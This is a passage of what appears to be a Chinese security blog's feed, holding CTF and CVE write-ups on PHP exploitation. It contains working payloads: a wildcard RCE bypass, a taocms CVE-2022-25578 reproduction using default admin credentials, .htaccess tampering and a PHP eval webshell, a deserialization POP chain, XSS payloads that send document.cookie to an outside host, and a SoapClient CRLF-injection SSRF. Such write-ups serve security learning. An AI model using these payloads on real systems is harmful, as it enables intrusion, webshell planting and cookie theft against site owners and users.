class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​将这段代码保存为html文件，然后，点击上传1.php(加入sh命令，如下)，抓包即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">ls</span><br></pre></td></tr></table></figure><h3 id="2-构造poc进行RCE"><a href="#2-构造poc进行RCE" class="headerlink" title="2.构造poc进行RCE"></a>2.构造poc进行RCE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=. /???/????????[@-[]</span><br></pre></td></tr></table></figure><p>​[]中<code>@-[</code>代表ASCII表中从<code>@</code>到<code>[</code>的所有字符，即A-Z</p><p><img src="/2024/07/13/RCE/1.png" alt="1"></p><p>​由于随机生成后六位字符，具有不确定性，所以多尝试发包几次，总会成功的</p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p><p><a href="https://blog.sina.com.cn/s/blog_af68a2c201016nh2.html">https://blog.sina.com.cn/s/blog_af68a2c201016nh2.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-25578</title>
      <link href="/2024/07/13/CVE-2022-25578/"/>
      <url>/2024/07/13/CVE-2022-25578/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2022-25578"><a href="#CVE-2022-25578" class="headerlink" title="CVE-2022-25578"></a>CVE-2022-25578</h1><p><a href="https://github.com/taogogo/taocms/issues/28">https://github.com/taogogo/taocms/issues/28</a></p><h2 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h2><p>​taocms v3.0.2允许攻击者通过编辑.htaccess文件执行任意代码</p><h2 id="二、知识点"><a href="#二、知识点" class="headerlink" title="二、知识点"></a>二、知识点</h2><h4 id="1-什么是-htaccess文件："><a href="#1-什么是-htaccess文件：" class="headerlink" title="1.什么是.htaccess文件："></a>1.什么是.htaccess文件：</h4><p>htaccess文件（或者分布式<a href="https://baike.baidu.com/item/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/286550?fromModule=lemma_inlink">配置文件</a>），全称是<a href="https://baike.baidu.com/item/Hypertext/812934?fromModule=lemma_inlink">Hypertext</a> Access（<a href="https://baike.baidu.com/item/%E8%B6%85%E6%96%87%E6%9C%AC/2832422?fromModule=lemma_inlink">超文本</a>入口）。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有<a href="https://baike.baidu.com/item/%E5%AD%90%E7%9B%AE%E5%BD%95/4728026?fromModule=lemma_inlink">子目录</a>。作为用户，所能使用的命令受到限制</p><h4 id="2-htaccess文件的功能："><a href="#2-htaccess文件的功能：" class="headerlink" title="2..htaccess文件的功能："></a>2..htaccess文件的功能：</h4><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><h4 id="3-本漏洞的应用："><a href="#3-本漏洞的应用：" class="headerlink" title="3.本漏洞的应用："></a>3.本漏洞的应用：</h4><p> 改变文件扩展名，我们需要在.htaccess文件末尾加上一下内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure><h2 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h2><h4 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h4><p>搜索有关taocms的信息，发现默认登录密码，admin:tao,登入后台</p><h4 id="2-寻找上传点"><a href="#2-寻找上传点" class="headerlink" title="2.寻找上传点"></a>2.寻找上传点</h4><p>在文件管理处发现有个新建文件夹和上传功能，但是好像不能用，但是发现目录下有.htaccess文件和一些php文件，那就直接在.htaccess里添加内容：AddType application&#x2F;x-httpd-php .png，在其中一个php文件中写入木马，如<?=eval($_POST[1])?></p><h4 id="3-蚁剑连接"><a href="#3-蚁剑连接" class="headerlink" title="3.蚁剑连接"></a>3.蚁剑连接</h4><p>添加URL地址，后面加上写了一句话木马的php文件，连接密码为1</p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化一道题详解</title>
      <link href="/2024/07/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%A6%E8%A7%A3/"/>
      <url>/2024/07/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80%E9%81%93%E9%A2%98%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/bkofyZ/p/17660907.html#comment_form_container">https://www.cnblogs.com/bkofyZ/p/17660907.html#comment_form_container</a></p><h1 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h1><h3 id="什么是序列化"><a href="#什么是序列化" class="headerlink" title="什么是序列化"></a>什么是序列化</h3><p><strong>定义：</strong>序列化就是将一个对象转换成字符串，反序列化则是将字符串重新恢复成对象</p><p>PHP序列化函数：serialize()</p><p>PHP反序列化函数：unserialize()</p><h3 id="几个常用的魔术方法："><a href="#几个常用的魔术方法：" class="headerlink" title="几个常用的魔术方法："></a>几个常用的魔术方法：</h3><table><thead><tr><th>名称</th><th align="left">触发时机</th></tr></thead><tbody><tr><td>__construct()</td><td align="left">在对象实例化（创建对象）的时候自动触发</td></tr><tr><td>__destruct()</td><td align="left">在销毁对象的时候自动触发</td></tr><tr><td>__wakeup()</td><td align="left">执行unserialize()时，先会调用这个函数</td></tr><tr><td>__sleep()</td><td align="left">执行serialize()时，先会调用这个函数</td></tr><tr><td>__call()</td><td align="left">在对象上下文中调用不可访问的方法时触发</td></tr><tr><td>__get()</td><td align="left">访问私有或不存在的成员属性的时候自动触发</td></tr><tr><td>__set()</td><td align="left">对私有成员属性进行设置值时自动触发</td></tr><tr><td>__isset()</td><td align="left">对私有成员属性进行 isset 进行检查时自动触发</td></tr><tr><td>__unset()</td><td align="left">对私有成员属性进行 unset 进行检查时自动触发</td></tr><tr><td>__toString()</td><td align="left">把类当作字符串使用时触发</td></tr><tr><td>__invoke()</td><td align="left">当尝试将对象调用为函数时触发</td></tr></tbody></table><h3 id="一般做题顺序"><a href="#一般做题顺序" class="headerlink" title="一般做题顺序"></a>一般做题顺序</h3><p>​构造pop链，找出它的起点或者终点，再利用魔术方法的触发条件和题目的代码结构，将POP链完善</p><p>​POP链：就是利用魔法方法进行多次跳转后获取敏感数据的一种payload</p><h3 id="接下来开始代码审计"><a href="#接下来开始代码审计" class="headerlink" title="接下来开始代码审计"></a>接下来开始代码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/***************************pop your 2022*****************************/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;page)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You can Not Enter 2022&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;page = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;effort = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;effort;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**********************Try to See flag.php*****************************/</span></span><br></pre></td></tr></table></figure><h4 id="1）找到终点-Try-work-Hard的append"><a href="#1）找到终点-Try-work-Hard的append" class="headerlink" title="(1）找到终点,Try_work_Hard的append()"></a>(1）找到终点,Try_work_Hard的append()</h4><p>​想到可以利用php伪协议读取数据流，那么怎么触发append()呢，发现下面的<code>__invoke()</code>可以触发append();</p><h4 id="2-接着Try-work-Hard-invoke"><a href="#2-接着Try-work-Hard-invoke" class="headerlink" title="(2)接着Try_work_Hard::__invoke()"></a>(2)接着Try_work_Hard::__invoke()</h4><p>​_<code>_invoke</code>:   当尝试将对象调用为函数时触发，看了一圈，发现$Make_a_Change类里面的$effort是可控的,且<code>__get</code>方法可以返回可控的函数，那就想办法让$effort为<code>Try_work_Hard</code>的类的对象</p><h4 id="3-接着Make-a-Change-get"><a href="#3-接着Make-a-Change-get" class="headerlink" title="(3)接着Make_a_Change()::__get()"></a>(3)接着Make_a_Change()::__get()</h4><p>​<code>__get</code>访问私有或不存在的成员属性的时候自动触发,利用它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()&#123;</span><br><span class="line">        return $this-&gt;string-&gt;page;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="（4）接着Road-is-Long-toString"><a href="#（4）接着Road-is-Long-toString" class="headerlink" title="（4）接着Road_is_Long::__toString()"></a>（4）接着Road_is_Long::__toString()</h4><p>​实例化化之后，让它的string指向Make_a_Change的类的对象，</p><h4 id="（5）继续Road-is-Long-wakeup"><a href="#（5）继续Road-is-Long-wakeup" class="headerlink" title="（5）继续Road_is_Long::__wakeup()"></a>（5）继续Road_is_Long::__wakeup()</h4><p>​__toString: 把类当作字符串使用时触发,</p><p>因为有protected属性的$var,这反序列化后会带特殊符号%00(url编码)，这个你复制粘贴不过来，但是urlencode可以显示出来好复制，不用你之后改</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php魔术方法</title>
      <link href="/2024/07/01/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
      <url>/2024/07/01/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><strong>构造函数</strong>：<code>__construct($u, $p)</code>，用于创建类的新实例时初始化用户名和密码。</p><p><strong>__wakeup魔术方法</strong>：当使用<code>unserialize</code>反序列化对象时，此方法会被调用。如果用户名或密码不为空，程序将终止执行。</p><p><strong>__invoke魔术方法</strong>：允许对象像函数一样被调用，执行<code>eval</code>函数，即执行<code>$this-&gt;code</code>变量中的代码。</p><p><strong>__sleep魔术方法</strong>：在对象被序列化之前调用，这里它将用户名和密码设置为空字符串。</p><p><strong>__unserialize魔术方法</strong>：在对象反序列化时调用，设置用户名、密码和<code>code</code>属性。</p><p><strong>__destruct魔术方法</strong>：当对象被销毁时调用，如果<code>code</code>属性等于十六进制的<code>0x36d</code>（十进制的<code>877</code>），则将密码写入以用户名命名的文件中。</p><p><strong>unserialize函数</strong>：最后，代码调用<code>unserialize</code>函数，传入通过GET请求获取的<code>vip</code>参数，这将创建<code>ctfshowvip</code>类的一个实例。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows10安装netcat</title>
      <link href="/2024/06/30/Windows10%E5%AE%89%E8%A3%85netcat/"/>
      <url>/2024/06/30/Windows10%E5%AE%89%E8%A3%85netcat/</url>
      
        <content type="html"><![CDATA[<h3 id="Windows10安装netcat"><a href="#Windows10安装netcat" class="headerlink" title="Windows10安装netcat"></a>Windows10安装netcat</h3><p>1.下载地址</p><ul><li>netcat-win32-1.12</li></ul><p><a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p><p>注：下载的时候记得关防火墙</p><p>2.操作</p><ul><li>解压netcat-win32-1.12.zip</li><li>配置解压好的目录路径到PATH环境变量</li><li>测试</li><li>打开命令行，输入以下命令:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -h</span><br><span class="line">nc -l -p 9999   -----&gt;监听9999端口，回车后即可发送内容</span><br></pre></td></tr></table></figure><p>不配置环境变量直接使用netcat</p><ul><li>直接将解压目录下的nc.exe复制到C:\Users\username目录下即可</li><li>Win+R输入cmd即可进行netcat连接</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php原生类学习</title>
      <link href="/2024/06/30/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/06/30/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP中利用原生类的反序列化以实现XSS"><a href="#PHP中利用原生类的反序列化以实现XSS" class="headerlink" title="PHP中利用原生类的反序列化以实现XSS"></a>PHP中利用原生类的反序列化以实现XSS</h2><p><a href="https://blog.csdn.net/weixin_63231007/article/details/128472820">https://blog.csdn.net/weixin_63231007/article/details/128472820</a></p><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121780909">https://blog.csdn.net/unexpectedthing/article/details/121780909</a></p><h3 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="BJDCTF 2nd xss之光"></a>BJDCTF 2nd xss之光</h3><p>1.先是git泄露，用Githack拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>2.利用php内置类，寻找有__toString类的方法</p><p>ERROR：</p><p>​ERROR这个原生类适用于php7版本</p><p>​Error类就是php的一个内置类用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个toString的方法。</p><p>Exception</p><p>​适用于php5、7版本</p><p>​这个类利用的方式和原理和Error 类一模一样，但是适用于php5和php7，相对之下更加好用。</p><p>利用如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>传参，成功弹窗</p><p>3.<strong>几种方法</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$y1ng</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;window.open(&#x27;http://a0a58185-02d8-4b85-8dbb-f5a991c8b45c.node3.buuoj.cn/?&#x27;+document.cookie);&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$y1ng</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//window.open 是 javaScript 打开新窗口的方法</span></span><br><span class="line"></span><br><span class="line">也可以用window.location.href=<span class="string">&#x27;url&#x27;</span>来实现恶意跳转</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;http://8ff615f3-da70-4d1a-959f-f29d817ecd90.node3.buuoj.cn&#x27;+document.cookie&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">或者用<span class="title function_ invoke__">alert</span>(document.cookie)直接弹出cookie，但此题不行，可能开了httponly（见附录）。</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$y1ng</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$y1ng</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>4.<strong>传参后Cookie查看flag</strong></p><h3 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h3><h5 id="什么是HttpOnly"><a href="#什么是HttpOnly" class="headerlink" title="什么是HttpOnly?"></a>什么是HttpOnly?</h5><p><strong>如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容，这样就增加了cookie的安全性，即便是这样，也不要将重要信息存入cookie。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Soap原生类</title>
      <link href="/2024/06/30/Soap%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
      <url>/2024/06/30/Soap%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p>  利用SoapClient类进行SSRF</p><p><a href="https://zhuanlan.zhihu.com/p/80918004">https://zhuanlan.zhihu.com/p/80918004</a></p><p><a href="https://www.freebuf.com/articles/network/331981.html">https://www.freebuf.com/articles/network/331981.html</a></p><p>1.拿到题目之后，发现需要传入一个反序列化的参数，并且调用一个不存在的 getFlag()方法，而我么们知道，调用一个不存在的公共方法，就会自动调用__call方法，因此我们应去联想哪些原生类有<code>__call</code>方法，贴一个脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.想到这道题的提示，很容易想到ssrf中的SoapClient类，并且它也存在__call方法!</p><p>在php手册上查询发现，这个方法可以调用远程soap方法！</p><p><img src="/2024/06/30/Soap%E5%8E%9F%E7%94%9F%E7%B1%BB/026a20a84124471225829921876bc8f9.png" alt="026a20a84124471225829921876bc8f9"></p><p>那现在思路就清晰了：我们需要利用SoapClient类构造一个post请求，让ip&#x3D;127.0.0.1，携带token&#x3D;’ctfshow’。</p><p>3.首先需要构造UA头，绕过127.0.0.1的限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span></span><br></pre></td></tr></table></figure><p>“\r\n”是CRLF注入，代表着”回车换行”，而我们知道，请求头和请求体之间是存在换行的，因此Content-Length和token之间存在了两对”\r\n”。之所以要写两个127.0.0.1，是因为代码中使用了两次array_pop,每次会删除最后一个数组元素 ，因此为了将$ip赋值给127.0.0.1，所以需要写两个127.0.0.1,Content-Type是发送请求体的长度，”token&#x3D;ctfshow”,长度为13</p><p>4.查询手册，找到SoapClient类的构造方法所需要的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$client=new SoapClient(null,array(&#x27;uri&#x27;=&gt;&quot;127.0.0.1&quot;,&#x27;location&#x27;=&gt;&#x27;http://127.0.0.1/flag.php&#x27;,&#x27;user_agent&#x27;=&gt;$ua));</span><br></pre></td></tr></table></figure><p>第一个参数为null,表示非wsdl模式，反序列化的时候会对第二个参数指明的url进行soap请求。</p><p>第二个参数中，可以设置uri,location,user_agent等值。</p><p>uri：指定命名空间URI(Namespace URI)</p><p>location: 指定Web服务的URL地址</p><p>user_agent：指定HTTP请求的User-Agent头</p><p>5.整合以上数据，进行序列化，然后传参，访问flag.txt得到flag:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"><span class="variable">$client</span>=<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;http://127.0.0.1/&quot;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span 